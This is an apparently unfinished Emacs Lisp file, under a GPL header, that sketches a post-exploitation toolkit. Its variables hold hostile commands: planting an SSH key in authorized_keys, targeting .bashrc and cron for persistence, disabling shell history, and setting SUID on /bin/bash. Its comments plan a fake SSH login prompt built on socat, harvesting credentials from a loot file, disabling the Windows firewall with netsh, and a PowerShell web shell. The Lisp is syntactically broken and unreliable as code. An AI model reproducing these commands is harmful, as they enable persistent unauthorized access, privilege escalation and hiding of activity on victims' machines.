;; This file is NOT part of GNU Emacs.

;; GNU Emacs is free software: you can redistribute it and/or modify
;; it under the terms of the GNU General Public License as published by
;; the Free Software Foundation, either version 3 of the License, or
;; (at your option) any later version.

;; GNU Emacs is distributed in the hope that it will be useful,
;; but WITHOUT ANY WARRANTY; without even the implied warranty of
;; MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
;; GNU General Public License for more details.

;; You should have received a copy of the GNU General Public License
;; along with GNU Emacs.  If not, see <https://www.gnu.org/licenses/>.

;;; Code:

(defun persistence)
(defvar persistence-target "~/.bashrc" "/var/spool/cron/"(user-login-name))
(defvar persistence-payload "echo "ka0x@dev >>/~/.ssh/authorized_keys"")
(defvar persistence-amnesia "HISTFILE=/dev/null")
(defvar upgrade-shell) ;; uploads base64 encoded socat binary, exposes it on ssh port, make a fake login prompt, and fake openssh headers.
(defvar callback  "") ;; Parse Loot file for username, try to ssh using it and notif on success

(defun privilege)
(defvar privilege-persistence-payload "chmod +s /bin/bash")

;; Add Windows & OS detection
;; Windows deactivate firewall
;; netsh advfirewall set allprofiles state off
;; Enable powershell web shell (Built in Powershell)